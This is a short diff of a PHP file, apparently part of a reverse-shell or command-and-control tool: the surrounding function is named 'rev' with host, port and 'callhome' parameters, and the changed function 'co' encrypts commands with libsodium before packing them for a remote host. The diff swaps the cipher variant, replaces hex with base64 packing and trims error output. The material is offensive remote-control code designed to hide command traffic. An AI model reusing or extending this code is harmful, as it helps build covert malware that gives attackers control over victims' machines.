@@ -494,18 +494,18 @@ function rev($host, $port, $method, $callhome)
 function co($command, $host, bool $encrypt)
 {
     if ($encrypt === true && !is_null($command)) {
-        $our_nonce = openssl_random_pseudo_bytes(24);
+        $our_nonce = openssl_random_pseudo_bytes(SODIUM_CRYPTO_AEAD_CHACHA20POLY1305_NPUBBYTES);
         $secure_Key = openssl_random_pseudo_bytes(32);
         $additionalData = openssl_random_pseudo_bytes(16);
         try {
-            $un = base64_encode(serialize($command));
-            $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
+            $un = base64_encode($command);
+            $ct = sodium_crypto_aead_chacha20poly1305_encrypt($un, $additionalData, $our_nonce, $secure_Key);
             $cr = "2";
-            $space_Safe_coms = base64_encode(bin2hex($our_nonce) . "." . bin2hex($secure_Key) . "." . bin2hex($additionalData) . "." . bin2hex($ct));
+            $space_Safe_coms = base64_encode(base64_encode($our_nonce) . "." . base64_encode($secure_Key) . "." . base64_encode($additionalData) . "." . base64_encode($ct));
         } catch (SodiumException $exception) {
-            echo "What happened: ". $exception->getMessage().PHP_EOL;
-            echo "Where it happened: ". $exception->getTraceAsString().PHP_EOL;
-            echo "The line it happened on: ".$exception->getLine().PHP_EOL;
+            echo $exception->getMessage();
+            echo $exception->getTraceAsString();
+            echo $exception->getLine();
             return 0;
         }
     } elseif ($command === 'base'){
